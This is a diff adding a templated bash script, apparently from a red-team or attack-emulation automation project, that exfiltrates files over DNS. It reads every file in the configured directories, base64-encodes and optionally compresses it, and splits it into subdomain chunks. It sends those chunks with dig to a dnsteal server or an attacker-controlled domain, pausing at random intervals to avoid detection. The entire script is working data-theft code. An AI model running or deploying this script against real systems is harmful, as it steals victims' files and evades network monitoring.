@@ -1,0 +1,59 @@
+#!/bin/bash
+
+s={{ exfiltration_sub_domains | default(4) }}
+b={{ exfiltration_block_size | default(56) }}
+{# if exfiltration_dns_host is set DNS queries are sent to the dnsteal servers IP directly #}
+dns="{{ '@'+exfiltration_dns_host if exfiltration_dns_host is defined and exfiltration_dns_host|length else '' }}"
+{# 
+    if exfiltration_domain is set then the given domain is appended to each DNS queries
+    this allows us to send DNS queries without specifying the target server, if we have
+    an authoritative DNS for the domain configured. (Note that this reduces the amount of bytes we can send per package).
+#}
+domain="{{ '.'+exfiltration_domain if exfiltration_domain is defined and exfiltration_domain|length else '' }}"
+directories="{{ exfiltration_directories | join(' ') }}"
+
+check_stop() {
+	if [ "$1" != "0" ]; then
+		exit;
+	fi
+}
+
+{% if exfiltration_compressed %}
+encode() {
+    gzip -c $1| base64 -w0 | sed "s/.\{$b\}/&\n/g"
+}
+{% else %}
+encode() {
+    base64 -w0 $1 | sed "s/.\{$b\}/&\n/g"   
+}
+{% endif %}
+
+split() {
+    f=$1
+    c=0
+    for i in $(encode $f); do 
+        if [[ "$c" -lt "$s"  ]]; then
+            echo -ne "$i-.";
+            c=$(($c+1));
+        else
+            echo -ne "\n$i-.";
+            c=1;
+        fi;
+    done
+}
+
+
+for d in $directories; do
+    cd "$d"
+    for f in $(find . -maxdepth 1 -not -type d -exec basename {} \;); do 
+        ix=0; 
+        for r in $(split $f); do 
+            _silent=$(dig $dns `echo -ne 3x6-.${ix}-.$r$(echo $f | sed "s/^\./,/")$domain|tr "+" "*"` +short;)
+            ix=$(($ix+1));
+            check_stop $?
+            sleep $(shuf -i {{ exfiltration_sleep_min | default(0) }}-{{ exfiltration_sleep_max | default(0) }} -n 1)
+        done; 
+        _silent=$(dig $dns `echo 3x7-.0-.$(echo $f | sed "s/^\./,/")$domain|tr "+" "*"` +short;)
+        check_stop $?
+    done;
+done;
